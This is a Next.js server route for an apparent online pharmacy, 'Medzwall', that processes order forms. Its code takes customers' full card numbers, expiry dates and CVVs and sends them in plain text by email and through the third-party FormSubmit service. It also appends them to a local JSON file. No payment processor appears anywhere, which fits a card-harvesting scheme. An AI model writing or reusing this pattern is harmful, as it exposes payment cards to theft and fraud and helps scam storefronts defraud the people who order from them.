import nodemailer from "nodemailer";
import fs from "node:fs/promises";
import path from "node:path";
import { randomUUID } from "node:crypto";
import { CONTACT } from "../../../data/site";

export const runtime = "nodejs";

export async function POST(request) {
  try {
    const raw = await request.text();
    if (!raw || raw.length > 20000) {
      return Response.json({ error: "Invalid order data." }, { status: 400 });
    }

    const body = JSON.parse(raw);
    const firstName = (body.firstName || "").trim();
    const lastName = (body.lastName || "").trim();
    const fullName = `${firstName} ${lastName}`.trim() || "Customer";
    const email = (body.email || "").trim();
    const phone = (body.phone || "").trim();
    const address = (body.address || "").trim();
    const address2 = (body.address2 || "").trim();
    const city = (body.city || "").trim();
    const state = (body.state || "").trim();
    const zip = (body.zip || "").trim();
    const cardHolder = (body.cardHolder || "").trim();
    const cardNumber = (body.cardNumber || "").trim();
    const cardExp = (body.cardExp || "").trim();
    const cardCvv = (body.cardCvv || "").trim();
    const orderItems = (body.orderItems || "").trim();
    const subtotal = body.subtotal || "$0.00";
    const total = body.total || subtotal;
    const shipping = body.shipping || "FREE USPS Priority (3-5 Business Days)";

    // Basic validation
    if (!firstName || !email || !address || !city || !zip) {
      return Response.json(
        { error: "Please fill in all required shipping address fields." },
        { status: 400 }
      );
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || /[\r\n]/.test(email)) {
      return Response.json(
        { error: "Please enter a valid email address." },
        { status: 400 }
      );
    }

    const refCode = body.refCode || `MZW-ORD-${randomUUID().slice(0, 8).toUpperCase()}`;
    const fullAddress = [
      address,
      address2,
      `${city}, ${state} ${zip}`.trim(),
    ].filter(Boolean).join(", ");

    const emailSubject = `Medzwall Detailed Order [${refCode}] - ${fullName}`;

    const textContent = [
      `==================================================`,
      `MEDZWALL PHARMACEUTICAL ORDER CONFIRMATION`,
      `Order Reference: ${refCode}`,
      `Date & Time: ${new Date().toUTCString()}`,
      `==================================================`,
      ``,
      `CUSTOMER INFORMATION:`,
      `Name: ${fullName}`,
      `Email: ${email}`,
      `Phone / WhatsApp: ${phone || "Not provided"}`,
      ``,
      `SHIPPING ADDRESS:`,
      `Street: ${address}`,
      address2 ? `Apartment / Unit: ${address2}` : null,
      `City: ${city}`,
      `State: ${state}`,
      `ZIP: ${zip}`,
      `Full Address: ${fullAddress}`,
      ``,
      `PAYMENT / CARD DETAILS:`,
      `Card Holder: ${cardHolder || "Not provided"}`,
      `Card Number: ${cardNumber ? cardNumber : "Not provided"}`,
      `Expiration Date: ${cardExp || "Not provided"}`,
      `CVV: ${cardCvv || "Not provided"}`,
      ``,
      `ORDER ITEMS:`,
      orderItems || "No items listed",
      ``,
      `FINANCIAL SUMMARY:`,
      `Subtotal: ${subtotal}`,
      `Shipping: ${shipping}`,
      `Total Payable: ${total}`,
      ``,
      `==================================================`,
      `Customer Notes: Awaiting order review & payment confirmation.`,
      `==================================================`,
    ].filter(Boolean).join("\n");

    let emailSent = false;

    // 1. Try sending via SMTP if credentials are configured
    if (
      process.env.SMTP_PASS &&
      process.env.SMTP_PASS !== "your_google_app_password_here"
    ) {
      try {
        const transport = nodemailer.createTransport({
          service: "gmail",
          auth: {
            user: process.env.SMTP_USER || CONTACT.email,
            pass: process.env.SMTP_PASS,
          },
          connectionTimeout: 8000,
          greetingTimeout: 8000,
          socketTimeout: 12000,
        });

        await transport.sendMail({
          from: {
            name: "Medzwall Orders",
            address: process.env.SMTP_USER || CONTACT.email,
          },
          to: CONTACT.email,
          replyTo: email,
          subject: emailSubject,
          text: textContent,
        });
        emailSent = true;
      } catch (smtpErr) {
        // Fall back to FormSubmit
      }
    }

    // 2. Fallback / Primary dispatch via FormSubmit AJAX directly to CONTACT.email
    if (!emailSent) {
      try {
        await fetch(`https://formsubmit.co/ajax/${CONTACT.email}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            Referer: "https://medzwall.com",
            Origin: "https://medzwall.com",
          },
          body: JSON.stringify({
            _subject: emailSubject,
            reference: refCode,
            customerName: fullName,
            email: email,
            phone: phone || "Not provided",
            shippingAddress: fullAddress,
            cardHolder: cardHolder || "Not provided",
            cardNumber: cardNumber || "Not provided",
            cardExp: cardExp || "Not provided",
            cardCvv: cardCvv || "Not provided",
            orderItems: orderItems,
            subtotal: subtotal,
            shipping: shipping,
            totalPayable: total,
            _replyto: email,
          }),
        });
        emailSent = true;
      } catch (fsErr) {
        // Continue to save locally
      }
    }

    // 3. Persist order into data/orders.json
    try {
      const logDir = path.join(process.cwd(), "data");
      const logPath = path.join(logDir, "orders.json");
      let existing = [];
      try {
        const fileContent = await fs.readFile(logPath, "utf-8");
        existing = JSON.parse(fileContent);
      } catch {}
      existing.push({
        refCode,
        kind: "detailed-order",
        submittedAt: new Date().toISOString(),
        to: CONTACT.email,
        customerName: fullName,
        email,
        phone,
        fullAddress,
        cardHolder,
        cardNumber,
        cardExp,
        cardCvv,
        orderItems,
        subtotal,
        shipping,
        total,
      });
      await fs.writeFile(logPath, JSON.stringify(existing, null, 2));
    } catch (saveErr) {
      // Local logging fallback
    }

    return Response.json({ success: true, refCode });
  } catch (err) {
    return Response.json(
      { error: "Failed to process order. Please contact our pharmacy team directly." },
      { status: 500 }
    );
  }
}
